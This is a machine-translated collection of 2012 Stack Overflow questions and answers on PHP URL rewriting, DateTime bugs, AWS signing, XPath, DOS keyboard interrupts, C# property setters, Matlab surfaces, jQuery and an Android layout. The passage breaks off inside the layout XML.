目前，在我的网站（[源世界游戏](http://www.sourceworldgaming.com)）上，我使用 $_GET 方法来显示评论/新闻文章。例如，“sourceworldgaming.com/reviews.php?id=40”将在数据库中显示评论 #40。

IGN 不这样做。例如，他们使用[http://www.ign.com/games/guild-wars-2/pc-896298](http://www.ign.com/games/guild-wars-2/pc-896298) - 不需要 $_GET[]。这是怎么做到的？他们是否为每个单独的游戏创建索引？

我希望能够使 URL sourceworldgaming.com/reviews.php/40

另外，这样做会使我的网站对搜索引擎更友好吗？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:54:08.043

它使用 mod_rewrite 和脚本的路由器部分完成：

网址：`http://www.example.com/games/guild-wars-2/pc-896298`

实际上传递给脚本，如：

`http://www.example.com/?route=/games/guild-wars-2/pc-896298`

通过使用 mod_rewrite（示例）

```
RewriteEngine On
Options -Indexes
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php?route=$1 [L,QSA] 
```

然后基本上`/games/guild-wars-2/pc-896298`被分成几块使用

`$route = explode('/',$_GET['route'])`

`$route[0]`控制器或查询类别也是 如此。`$route[1]`将是动作或查询游戏，因为`$route[0]`是游戏类别等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:59:02.390

`/foo.php`请求转到您服务器上命名的文件这一事实`foo.php`只是一个实现细节。网络上没有什么需要这样做，这只是很多系统都会做的事情，包括 PHP。许多其他系统使用不同的约定，例如路由表或对象遍历。

如果您已经建立了一个使用文件系统来路由请求的网站，那么获取不同 URL 的最简单方法是在您使用的任何 Web 服务器软件上使用 mod_rewrite 或等效的。

# php - 仅在生产服务器上使用 DateTime 的 PHP 真的很奇怪的错误行为

> ID：12014864
> 
> 赞同：3
> 
> 时间：2012-08-18T00:46:01.897
> 
> 标签：php, datetime

简单来说：

```
 $end   = new \DateTime();
    $start = clone $end;

    // Remove 30 days from today and set midnight
    $start->sub(new \DateInterval('P30D'));
    $start->setTime(0, 0);

    var_dump(new \DateInterval('P30D'));
    var_dump($start, $end); die(); 
```

输出（格式很好）：

```
object(DateInterval)#1516 (8)
{ ["y"]=> int(0)
  ["m"]=> int(0)
  ["d"]=> int(30)
  ["h"]=> int(0)
  ["i"]=> int(0)
  ["s"]=> int(0)
  ["invert"]=> int(0)
  ["days"]=> int(0) }

object(DateTime)#1523 (3)
{ ["date"]=> string(19) "2012-06-19 00:00:00"
  ["timezone_type"]=> int(3)
  ["timezone"]=> string(11) "Europe/Rome"
}

object(DateTime)#4682 (3)
{ ["date"]=> string(19) "2012-08-18 02:42:23"
  ["timezone_type"]=> int(3)
  ["timezone"]=> string(11) "Europe/Rome"
} 
```

1个月的错误......有什么线索吗？

**编辑**：仅在使用时正确行为：

```
$start->modify('-30 days'); 
```

注释掉该`DateInterval`行。

```
PHP 5.3.2-1ubuntu4.17 with Suhosin-Patch (cli) (built: Jun 19 2012 01:35:33)
Copyright (c) 1997-2009 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies
    with XCache v1.3.0, Copyright (c) 2005-2009, by mOo

Server version: Apache/2.2.14 (Ubuntu)
Server built:   Feb 14 2012 18:09:18 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T01:44:34.357

[自 5.3.2 以来](http://php.net/ChangeLog-5.php)，已修复了许多 DateTime 错误 我在 5.3.16 上测试了您的代码，它工作正常，没有重复的减法。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-18T00:52:28.043

反斜杠是怎么回事？据我所知，一切看起来都不错。

# amazon-web-services - 我收到“请求必须包含参数签名”，尽管我实际上是在提供它

> ID：12014865
> 
> 赞同：1
> 
> 时间：2012-08-18T00:46:03.220
> 
> 标签：amazon-web-services

我正在 PhP 中尝试 AWS 产品广告 API。这是我从网上复制的 PhP 代码。

```
function callSOAPFunction($function, $array){

 $timeStamp = gmdate("Y-m-d\TH:i:s\Z");

 //service is always the same, $function is operation
 $string = 'AWSECommerceService'.$function.$timeStamp;

 $signature = base64_encode(hash_hmac("sha256", $string, 'MySecretKey', True));

$params = array('Service' => 'AWSECommerceService',
'AssociateTag' => 'Wassup?',
**'Signature' => $signature,**
'AWSAccessKeyId' => 'MyKey'

'Request' => array($array),
'Timestamp' => $timeStamp
);

$client = new
SoapClient("http://webservices.amazon.com/AWSECommerceService/AWSECommerceService.wsdl",
array('exceptions' => 0));

return $client->__soapCall($function, array($params));
}

$array = array('Operation' => 'ItemSearchRequest',
'ItemPage' => 3,
'SearchIndex' => 'DVD',
'ResponseGroup' => 'Large',
'Keywords' => 'Karate');

$result = callSOAPFunction("ItemSearch", $array); 
```

尽管我包含了签名参数，但我仍然收到错误消息。

# wordpress - Wordpress 标签：将破折号变成空格？(

> ID：12014867
> 
> 赞同：0
> 
> 时间：2012-08-18T00:46:42.597
> 
> 标签：wordpress, wordpress-theming

将标签输入wordpress时，不允许使用空格，因此是否可以将标签输入为“Word1-Word2”并在网站上显示时将其转换为“Word1 Word2”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:57:21.230

[http://php.net/manual/en/function.str-replace.php](http://php.net/manual/en/function.str-replace.php) 在过滤器中或直接在 yr 主题中

# ruby-on-rails-3 - 使用 downloadUrl 的 Google Drive SDK 授权 GET 请求

> ID：12014869
> 
> 赞同：1
> 
> 时间：2012-08-18T00:46:56.167
> 
> 标签：ruby-on-rails-3, google-drive-api, httparty

在我的 Rails 3 应用程序中，我能够使用 Oauth2 成功进行身份验证，并能够获取文件的元数据。下载地址是

[https://doc-10-3o-docs.googleusercontent.com/docs/securesc/tj647mo7q16s2rquitcrcv800pkn7gcf/ap67p147th03cn8rjpu68i8qva3p7i8j/1345240800000/02289284805103305740/02289284805103305740/0BwsQ03A3DXbCTVBjUDlNNzNJNDQ?h=16653014193614665626&e=download&gd=true](https://doc-10-3o-docs.googleusercontent.com/docs/securesc/tj647mo7q16s2rquitcrcv800pkn7gcf/ap67p147th03cn8rjpu68i8qva3p7i8j/1345240800000/02289284805103305740/02289284805103305740/0BwsQ03A3DXbCTVBjUDlNNzNJNDQ?h=16653014193614665626&e=download&gd=true)

该文档指出我必须执行以下操作：

*按 ID 获取文件的元数据。要下载文件的内容，请将授权的 HTTP GET 请求发送到文件的 downloadUrl*

我不希望为 Ruby 使用 Google API 客户端库，而只是使用 HTTParty 制定一个 HTTP 请求

这是我一直试图开始工作的代码片段

```
response = HTTParty.get(https://doc-10-3o-docs.googleusercontent.com/docs/securesc/tj647mo7q16s2rquitcrcv800pkn7gcf/ap67p147th03cn8rjpu68i8qva3p7i8j/1345240800000/02289284805103305740/0?access_token={token})
open("/User/mymachine/test.pdf", 'wb'){|pdf| pdf << response.body} 
```

我很确定我提出的请求是错误的。任何帮助将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:25:07.440

您必须将`Authorization: Bearer`标头与您在 OAuth 2.0 流程中检索到的访问令牌一起添加到您的请求中。

基本上，您的 HTTP 请求必须类似于 OAuth 2.0 文档中的请求：

[https://developers.google.com/accounts/docs/OAuth2WebServer#callinganapi](https://developers.google.com/accounts/docs/OAuth2WebServer#callinganapi)

我不是 Ruby 专家，但使用 HTTParty 的请求应该是：

```
response = HTTParty.get(downloadUrl, :headers => {"Authorization" => "OAuth {token}"}) 
```

`downloadUrl`您从文件的元数据中获得的那个在哪里，并且`token`是您在执行授权时检索到的访问令牌。

# xpath - 如何在给定位置使用 xpath 获取 img 标签的高度或宽度属性的值

> ID：12014870
> 
> 赞同：2
> 
> 时间：2012-08-18T00:46:56.207
> 
> 标签：xpath, indexing, height, width, image

**对于下面的 XML，如何通过给出索引来获取 height 或 width 属性的值。**

```
<root>
<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer non nunc vitae nisl luctus pharetra   at eu nulla. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
    <img src="http://www.google.com/logos/pacman10-hp.png"/> Nullam in odio at ligula euismod adipiscing convallis in justo. Donec at massa nulla, at facilisis magna. Integer sit amet elit eu felis venenatis dignissim. In ut mi leo. Suspendisse blandit faucibus fermentum. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Phasellus ultricies turpis id magna semper vestibulum.
</p>

<p>Quisque blandit pretium libero, venenatis pellentesque purus egestas id. Integer nulla ante, pellentesque eget rhoncus sed, semper vel eros. Nam placerat est et est dictum egestas. Ut gravida blandit lacus rhoncus feugiat. Nunc ut euismod eros. Pellentesque sit amet vehicula mauris. Quisque in nulla quis sapien dictum mattis. Curabitur vehicula lorem ac elit dignissim egestas. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Cras sit amet tincidunt quam.
    <img src="http://www.google.com/logos/2010/gabor10-hp.png"/> Ut urna neque, mollis vel tempor placerat, cursus vel enim.
</p>

<p>Praesent gravida dignissim sagittis. Vivamus dictum nisi pulvinar augue vulputate euismod. Vestibulum arcu sapien, laoreet sagittis pulvinar ac, porttitor a tellus.
    <img width="100" height="100" src="http://www.google.com/logos/2010/d4g_worldcup10_ko-hp.jpg"/> Quisque cursus dignissim libero in convallis. Fusce cursus nisi ut felis feugiat sodales. Praesent nec arcu purus. Donec lorem lectus, tristique eget faucibus sit amet, bibendum nec ipsum. Mauris tempus laoreet tortor non egestas. Aliquam erat volutpat. Aliquam erat volutpat. Phasellus a arcu convallis nibh luctus tempor non quis sem.
    <img src="http://www.google.com/logos/2010/d4g_worldcup10_uk-hp.jpg"/> Aliquam ac risus velit, ut sodales justo. Ut eget lacus eget nisi hendrerit gravida quis et nibh. Etiam purus felis, fermentum a cursus at, congue vel eros. Aenean semper, sapien eget eleifend fermentum, odio sem tempor dolor, sed porta ligula nunc ac tellus.
</p>

<p>Mauris volutpat nisi vitae sem imperdiet sed ultricies est dictum. Mauris id urna turpis, sit amet rhoncus lectus. Maecenas vitae mi at nulla mattis congue id blandit purus.
    <img src="http://www.google.com/logos/2010/d4g_worldcup10_nl-hp.jpg"/> Maecenas hendrerit, dui eget faucibus pretium, tellus augue pellentesque metus, id molestie diam arcu ac nibh. Suspendisse sollicitudin viverra blandit. Maecenas sed tellus quis purus bibendum eleifend. Nunc sodales magna id nulla tristique et suscipit purus interdum. Ut at risus quam, nec rutrum risus. Integer ac leo lorem, eget porta nisi. Sed quis lacus dapibus massa commodo ornare. Mauris scelerisque rutrum accumsan. Duis fermentum adipiscing mi eget suscipit. Duis quis nisi libero, iaculis fermentum purus. Etiam risus nibh, tincidunt pellentesque luctus sed, gravida vitae magna.
    <img src="http://www.google.com/logos/2010/d4g_worldcup10_au-hp.jpg"/> Sed laoreet, erat id rutrum dignissim, elit libero fermentum enim, pretium auctor lectus urna vitae nulla. Nullam ante diam, elementum nec elementum quis, consectetur eget arcu.
</p>

<p>Fusce eu nisl risus. Fusce rhoncus iaculis viverra. Curabitur eleifend, nisl sed aliquam dapibus, urna leo scelerisque orci, id commodo dui libero vitae nisi.</p>
<img WIDTH="100" HEIGHT="100" src="http://www.google.com/logos/2010/d4g_worldcup10_nl-hp.jpg"/>
</root> 
```

我试过了

```
//img[1]/@width 
```

但不工作。基本上我需要一个 XPATH 来获取 img 标签的高度或宽度，而不管大小写（宽度或宽度），如果宽度属性不可用，它应该返回不匹配或 null

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T15:25:54.690

**使用**：

```
(//img)[$k]/@*[name() = 'width' or name() = 'WIDTH'] 
```

**您需要在哪里替换`$k`所需的图像索引**。

这将选择XML 文档中第-th元素的命名`"width"`或命名属性。`"WIDTH"``$k``img`

**例如，对于第三张图片使用**：

```
(//img)[3]/@*[name() = 'width' or name() = 'WIDTH'] 
```

# assembly - 使用汇编更改 ms-dos 中的键盘语言

> ID：12014871
> 
> 赞同：0
> 
> 时间：2012-08-18T00:46:57.480
> 
> 标签：assembly, keyboard, dos

我在汇编中比较大我想使用汇编语言开始一个项目这个程序必须将我的键盘从英语更改为另一种语言，例如谷歌 MS-DOS 环境中的土耳其语我搜索并找不到任何链接，任何人都可以帮助我问候

编辑问题：

对于一个项目，我需要更改打字键盘语言。本项目必须在 MS-DOS 6.22 平台下用汇编语言编写。我是组装的初学者。如果您可以详细说明，我不知道如何在程序集中定义字体。

/编辑

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T14:28:16.793

我不认为 MS-DOS 有任何国际化。如果你想要土耳其语键盘，你要么需要土耳其语版本的 MS-DOS，要么需要真正的操作系统。因为 DOS 上的字符串处理和通过 BIOS 非常有限，多字节字符需要为它们设计的程序。此外，因为 MS-DOS（和所有 DOS）通过 BIOS 完成大部分 IO，并且 BIOS 很可能不支持土耳其语字符（除非它是土耳其语 BIOS）。这就是为什么大多数现代操作系统完全绕过 BIOS 并使用自己的文本和键盘驱动程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T14:55:13.200

这个问题太宽泛了。但是我可以给出一些关于如何为 DOS 实现键盘布局切换器之类的提示。

您将需要做 3 件事：

1.  实现您自己的 IRQ1 (int 9) ISR 以接收键盘输入并手动将扫描代码和字符存储在 BIOS 数据区域中，并更新 BIOS 数据区域中的 alt、control 和 shift 键的状态。
2.  将 int 10h 与您自己的 ISR 挂钩，以在设置文本模式时为您的语言加载和激活 8x8 和 8x16 字体（如果显示为 VGA 或更好，则为 8x8 和 8x14，如果是 EGA）。
3.  使程序成为 DOS 驻留程序（例如使用 DOS int 27h）。

有关 int 10h、int 27h 和 BIOS 数据区的说明，请参见 Ralf Brown 的中断列表。通过端口查找中断处理和键盘 I/O 的其他位置。

# c# - 为什么使用私有属性设置器，因为可以直接访问成员变量？

> ID：12014872
> 
> 赞同：6
> 
> 时间：2012-08-18T00:47:07.400
> 
> 标签：c#, properties, field

在 C# 中，我们可以执行以下操作：

```
private string _myField;

public string MyProperty
{
    get { return _myField; }
    private set { _myField = value; }
} 
```

在这里的属性中使用私有设置器有什么好处，而我们可以根据`_myField`需要在类中设置？为什么我们要使用 setter `MyProperty`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-18T00:48:49.870

当属性更新时，setter 可以实现其他行为/逻辑，因此您不必在可能更新属性的每个位置手动实现它。

它可以：

*   自动更新其他字段
*   验证新值（例如，确保电子邮件地址与正则表达式匹配）
*   将每次更新字段时需要运行的代码保留在一个地方

例如：

```
private string _myField;
private int _myField_num_updated;
private DateTime _myField_updated_at;

public string MyProperty
{
    get { return _myField; }
    private set {
      _myField = value;
      _myField_num_updated++;
      _myField_updated_at = DateTime.Now;
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-18T00:54:55.090

使用属性访问器 (`get`和`set`) 的目的是隐藏有关如何查询或修改特定值的内部实现。在您的情况下，设置器很简单，但在未来，它可能会变得更加复杂。通过隐藏实现，您可以最大限度地减少潜在更改的影响并保持界面简单。

现在关于您的问题：为什么使用*私人*二传手？使用私有 setter 的原因与一般使用 setter 的原因完全相同。在私有设置器的情况下，该设置器的用户是类本身的代码。在公共设置器的情况下，用户可以是使用该类的任何人。使用 setter 的优点是一样的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-18T00:54:49.537

因为虽然属性通常包装支持字段，但没有理由*必须*. 属性还可以实现自定义业务逻辑（通常是某种验证或转换）并调用其他函数。使用私有 setter 可以使您的代码更惯用（意味着其他人会更容易理解您在做什么）和更具表现力（意味着代码将或应该更接近地反映您正在尝试*完成*的语义。私有 setter 也允许封装此自定义逻辑，以便在逻辑更改或代码需要重构的情况下只需要更改一个地方。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-18T00:53:33.047

使用 setter，您可以在尝试设置它时控制该值，例如，如果您有一个 int，您希望确保它的值不大于 10。

```
public int MyProp 
{
    get { return _my_prop;}
    private set {
        if value > 10 {
            _my_prop = 10;
        }

    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-18T00:58:23.403

[物业](http://msdn.microsoft.com/en-us/library/x9fsa0sw.aspx)主要用于两个目的：

*   避免从外部意外访问底层字段
*   隐藏底层字段的实现细节，只要保留接口就可以自由更改实现。

至于私人设置，虽然第一项没有多大意义，但第二项仍然有效

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-18T01:07:59.910

需要在属性中使用私有设置器是使用包装在属性中的字段仅用于由其他函数直接修改，您的类的属性。因此，在一个地方（属性），您设置了字段的值，但类的所有其他元素不必直接访问您的私有字段，而是通过包装它的属性。

# macos - Windows 的 AllocationPreference - 就像在 MacOS 中设置来测试 32->64 位代码？

> ID：12014880
> 
> 赞同：1
> 
> 时间：2012-08-18T00:48:48.757
> 
> 标签：macos, testing, 32bit-64bit

正如这里之前的答案中所提到的，Windows 操作系统有一个注册表项，用于强制从自上而下分配内存，以帮助在从 32 位代码 -> 64 位移动时捕获指针截断问题。

> HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Memory Management\AllocationPreference

但是我在 MacOS 中看不到任何类似的东西。我写了一个快速程序来检查，似乎在 64 位中，所有分配的内存至少需要 33 位来表示它们的地址。

我想知道 64 位 MacOS X 程序是否会在可以以 32 位或更少位表示的地址空间中分配内存？如果我在 32 位中编译和运行相同的程序，它显然使用较低 32 位空间中的地址。

```
int main(int argc, const char * argv[])
{
    void * ptr = NULL;
        for (int i = 0; i < 20; i++)
        {
            ptr = malloc(10);
            if ((UInt64)ptr > INT32_MAX)
                printf("Pointer = %p > 32 bits required!\n", ptr);
            else
                printf("Pointer = %p <= 32 bits ok\n", ptr);
        }
    return 0;
} 
```

谢谢你的帮助！

马特

# matlab - Matlab：设置单个表面的阴影

> ID：12014883
> 
> 赞同：3
> 
> 时间：2012-08-18T00:49:40.390
> 
> 标签：matlab, matlab-figure

我正在制作一个泛化圆柱体功能的函数，以便圆柱体有盖，可以是任何尺寸和方向。然而，从气缸的外观来看，我遇到了堵塞。为了使盖子看起来正确，弯曲部分需要一组阴影，而盖子需要另一组。（在您要求制作 3 个表面之前不是一个选项）

以下是相关代码：

```
 surface(xSurf,ySurf,zSurf,c,'EdgeColor','none','FaceLighting','phong'); 
```

如果您想查看整个代码。

感谢您的帮助，

约翰

```
 function varargout = DrawCylinder(x,y,z,r,h,aVec,bVec,cVec,ccolor, npts)
    % DrawCylinder Generate a three-dimensional cylinder
    %
    % DrawCylinder(x,y,z,a,b,c,aVec,bVec,CVec,ccolor, npts) 
    % creates a surface plot of a cylinder whose center is at (x,y,z), has
    % semiaxes of length a, b, and c.  The unit vectors associated with each
    % semixis are aVec, bVec, and cVec and must be size 3 x 1 (column vector)
    % with size of npts + 1.
    %
    % H = DrawCylinder(...) creates the surface plot and returns the handle H to each
    % graphical object created.
    %
    % [X Y Z] = DrawCylinder(...) does not generate the surface plot and returns
    % the data necessary to create the surface using:
    % SURF(X,Y,Z);
    %
    % [X Y Z C] = DrawCylinder(...) does not generate the surface plot and returns
    % the data necessary to create the surface using:
    % SURF(X,Y,Z,C,'cdataMapping','direct');

    %CREATE SURFACE FOR CYLINDER
    [xCyl,yCyl,zCyl]=cylinder(1,npts);

    xSurf=[zeros(1,max(size(xCyl)));xCyl;zeros(1,max(size(xCyl)))];
    ySurf=[zeros(1,max(size(yCyl)));yCyl;zeros(1,max(size(yCyl)))];
    zSurf=[zeros(1,max(size(zCyl)));zCyl;ones(1,max(size(zCyl)))] - 0.5;

    xSurf = xSurf*r;
    ySurf = ySurf*r;
    zSurf = zSurf*h;

    %ROTATE CYLINDER
    %Make sure aVec,bVec, and cVec are column unit vectors:
    if all(size(aVec)==[1,3])
        aVec=aVec';
    end
    if all(size(bVec)==[1,3])
        bVec=bVec';
    end
    if all(size(cVec)==[1,3])
        cVec=cVec';
    end
    aVec=aVec/norm(aVec); %Make unit vectors
    bVec=bVec/norm(bVec);
    cVec=cVec/norm(cVec);

    rot = [aVec,bVec,cVec]; %The rotation matrix

    [iMax, jMax] = size(xSurf);

    for i=1:iMax
        for j=1:jMax
            rotatedPt = rot*[xSurf(i,j);ySurf(i,j);zSurf(i,j)];
            xSurf(i,j) = rotatedPt(1);
            ySurf(i,j) = rotatedPt(2);
            zSurf(i,j) = rotatedPt(3);
        end
    end

    %TRANSLATE CYLINDER
    xSurf = xSurf + x;
    ySurf = ySurf + y;
    zSurf = zSurf + z;

    c = ccolor*ones(size(xSurf));
    if nargout == 0
        surface(xSurf,ySurf,zSurf,c,'EdgeColor','none','FaceLighting','phong');
    elseif nargout == 1
        varargout = {surface(xSurf,ySurf,zSurf,c,'EdgeColor','none','FaceLighting','phong');};
    elseif nargout == 3
        varargout = {xSurf ySurf zSurf};
    elseif nargout == 4
        varargout = {xSurf ySurf zSurf c};
    end

    end 
```

2012 年 8 月 18 日编辑：

只是为了让你能看到。

这就是我得到的...

![这就是我得到的](../Images/8b5c9477e5bba1dbdf908f1d787786c7.png)

这就是我想要的...

![这就是我想要的](../Images/544c4bea776692f38b6d9f05da1297e8.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T17:08:53.283

我很确定“阴影”只是指端盖的颜色，而不是更复杂的效果。如果是这样，那很简单，我将举一个灰度示例

改变

```
c = ccolor*ones(size(xSurf)); 
```

到

```
c = (ccolor/255)*ones(size(xSurf));
c([1 3],:)=max(0,(ccolor-10))/255; 
```

第一行`c`用归一化的 ccolor 初始化矩阵（期望 8 位灰度 ccolor 输入，它归一化为 0..1）。第二行将帽（第 1 行和第 3 行）更改为稍深的颜色，在 0 处触底，并单独保留圆柱体表面（第 2 行和第 4 行）。

为了确保正确查看结果，您需要更改 nargout==0 条件，使其看起来像这样

```
surface(xSurf,ySurf,zSurf,c,'EdgeColor','none','FaceLighting','phong');
colormap(gray(256));
caxis([0 1]); 
```

颜色图只是设置颜色图，类似于 8 位灰度。caxis 命令相当关键。根据 Matlab 的表面文档

> MATLAB 对此数据执行线性变换以从当前颜色图中获取颜色

为了我们的目的，这是不好的。由于我们只有两个值，最低值将更改为 0，最高值将更改为 1。这实际上忽略了我们的 ccolor 输入，并给出了一个带有两个黑色大写字母的白色圆柱体。使用`caxis([0 1])`保留完整比例和 ccolor 在其中的位置。

**更新：**

听起来我误解了你想要什么，实现非常接近你想要的效果的最简单方法是将'MeshStyle'设置为'row'，如下所示：

surface(xSurf,ySurf,zSurf,c,'EdgeColor','k','FaceLighting','phong','MeshStyle','row');

这将为您提供以下结果：![加盖气缸](../Images/30f95a31ea2d75616f22f3b2221e2ca3.png)

仍然有一个中心点，但它是迄今为止产生这种效果的最简单的方法。

# javascript - jquery幻灯片效果只适用于我的电脑

> ID：12014889
> 
> 赞同：0
> 
> 时间：2012-08-18T00:51:07.117
> 
> 标签：javascript, jquery, webserver, slide

只有当我在我的计算机中测试文件时，幻灯片效果才有效，如果我放入 linux/cpanel 主机，它就不起作用。请注意，所有 .js 文件都是外部的（在 jquery 服务器中）我不知道出了什么问题。有人可以帮助我吗？我用铬。

jQuery：

```
<script src="http://code.jquery.com/jquery-latest.js"></script>
<script src="http://ui.jquery.com/latest/ui/jquery.effects.core.js"></script>
<script src="http://ui.jquery.com/latest/ui/jquery.effects.slide.js"></script>
<script>
  $(document).ready(function() {
    $("#slide").show("slide", {direction: "left"}, 1000);
  });
</script> 
```

html:

```
<div id="slide">
  teeeeeeeeeeeeeeeeeeeeeeeeeeste
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T01:12:35.727

出于某种原因，这个小提琴不起作用（使用你的 jQuery 资源）：http: [//jsfiddle.net/YJaME/8/](http://jsfiddle.net/YJaME/8/)

但是用 Google 的 jQuery 版本替换它就可以正常工作：http: [//jsfiddle.net/YJaME/9/](http://jsfiddle.net/YJaME/9/)

这是相同的代码，唯一的区别是我在`src`. 您使用自己的版本与 Google 托管的版本有什么原因吗？如果没有，我会看看改变这个是否有帮助。

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js"></script>

<script>
  $(document).ready(function() {
    $("#slide").show("slide", {direction: "left"}, 1000);
  });
</script>

<div id="slide">
  teeeeeeeeeeeeeeeeeeeeeeeeeeste
</div> 
```

# android - 为什么活动打开时焦点没有设置到第一个文本字段？

> ID：12014890
> 
> 赞同：2
> 
> 时间：2012-08-18T00:51:16.953
> 
> 标签：android, android-linearlayout

下面的 xml 显示了我的布局。如果您在图形编辑器中查看此布局，“Tempo”EditText 为蓝色。这使得该字段成为活动打开时具有焦点的项目。我想让“名称”字段成为活动开始时具有焦点的第一个字段。有任何想法吗？谢谢。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/content_panel"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="#fffafafa"
    android:orientation="vertical" >

    <ScrollView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/scroll_view"
        android:layout_width="fill_parent"
        android:layout_height="0dip"
        android:layout_weight="1.0"
        android:fadingEdge="none" >

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:paddingLeft="10.0dip"
            android:paddingRight="10.0dip"
            android:paddingTop="10.0dip"
            android:focusableInTouchMode="true" >

            <LinearLayout
                android:id="@+id/songname_layout"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/songname"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <EditText
                    android:id="@+id/edit_songname"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:imeOptions="actionNext"
                    android:inputType="textCapSentences"
                    android:textColor="#ff000000" >

                </EditText>
            </LinearLayout>

            <LinearLayout
                android:id="@+id/artist_layout"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/artist"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <AutoCompleteTextView
                    android:id="@+id/autocomplete_artist"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:imeOptions="actionNext"
                    android:inputType="textCapSentences"
                    android:textColor="#ff000000" />
            </LinearLayout>

            <LinearLayout
                android:id="@+id/genre_area"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/genre"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <AutoCompleteTextView
                    android:id="@+id/autocomplete_genre"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:imeOptions="actionNext"
                    android:inputType="textCapSentences"
                    android:textColor="#ff000000" />
            </LinearLayout>

            <LinearLayout
                android:id="@+id/notes_area"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/notes"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <EditText
                    android:id="@+id/notes"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:capitalize="sentences"
                    android:gravity="top"
                    android:imeOptions="actionNext"
                    android:inputType="textCapSentences"
                    android:minLines="3"
                    android:textColor="#ff000000" />
            </LinearLayout>

            <LinearLayout
                android:id="@+id/song_length_area"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/song_length"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <LinearLayout
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal" >

                    <EditText
                        android:id="@+id/edit_minute"
                        android:layout_width="60dp"
                        android:layout_height="wrap_content"
                        android:gravity="right"
                        android:imeOptions="actionNext"
                        android:inputType="number"
                        android:maxLength="3"
                        android:textColor="#ff000000" />

                    <TextView
                        style="?android:attr/textAppearanceSmall"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="@string/semicolon"
                        android:textColor="#ff000000"
                        android:textStyle="bold" />

                    <EditText
                        android:id="@+id/edit_second"
                        android:layout_width="40dp"
                        android:layout_height="wrap_content"
                        android:gravity="right"
                        android:imeOptions="actionNext"
                        android:inputType="number"
                        android:maxLength="2"
                        android:textColor="#ff000000" />

                    <TextView
                        style="?android:attr/textAppearanceSmall"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="@string/minsec"
                        android:textColor="#ff000000"
                        android:textStyle="bold" />
                </LinearLayout>
            </LinearLayout>

            <LinearLayout
                android:id="@+id/tempo_area"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical" >

                <TextView
                    style="?android:attr/textAppearanceSmall"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/tempo"
                    android:textColor="#ff000000"
                    android:textStyle="bold" />

                <EditText
                    android:id="@+id/edit_tempo"
                    android:layout_width="60dp"
                    android:layout_height="wrap_content"
                    android:gravity="right"
                    android:imeOptions="actionNext"
                    android:inputType="number"
                    android:maxLength="3"
                    android:textColor="#ff000000" >

                    <requestFocus />
                </EditText>
            </LinearLayout>

            <LinearLayout
                android:id="@+id/key_area"
